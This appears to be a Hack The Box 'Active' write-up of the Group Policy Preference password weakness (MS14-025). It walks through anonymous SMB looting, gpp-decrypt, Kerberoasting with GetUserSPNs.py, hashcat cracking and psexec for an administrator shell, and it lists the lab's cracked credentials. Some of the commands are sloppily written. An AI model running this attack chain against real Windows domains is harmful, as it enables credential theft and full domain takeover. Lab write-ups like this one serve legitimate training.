## Group Policy Preference Attack AKA MS14-025

GPP allows admin to create policy using embedded credentials.
These credentials were encrypted and stored in cPassword file
it patched but, Still exist

## Walk Through - Active

#### Hack The Box - Active machine walkthrough

```sh

# do an nmap scan on the target
> nmap -T4 <ip address> -v
# inspect the output and in this activity smb was open

> smbclient -L ////<ip address>//
# this lists the smb shares

# login to a share anonymously
> smbclient -L ////<ip address>//<sharename>

# turn off prompt
> prompt off

# turn of recurse
> recurse on

# donwload all files to our system
> mget *

# locate Groups.xml files from downloaded files
# open the xml file and enumerate sensitive information.
# you wil get domain and credentials.

# password will be encrypted, so we have to decrypt the password
> gpp-decrypt <encrypted password>
# you will get decrypted password using this tool

> GetUserSPNs.py < <domain>/<username>:<password>: active.htb/svc_tgs:GPPstillStandingStrong2k18> -dc-ip <victim-ip> -request 
# you will get a ticket issues by tgs server

# decrypt the hash using hashcat in windows and get the password of administrator

> hashcat64.exe -m 13100 <hashfile.txt> <wordlist> -O

Administrator // Ticketmaster1968

# now use this cracked credential in psexec to get a shell.

> psexec.py < <domain>/<username>:<Password>@<ip address>: active.htb/Administrator:Ticketmaster1968@10.10.10.100>

# Ta Da !! root shell spwnd

> whoami
> hostname

```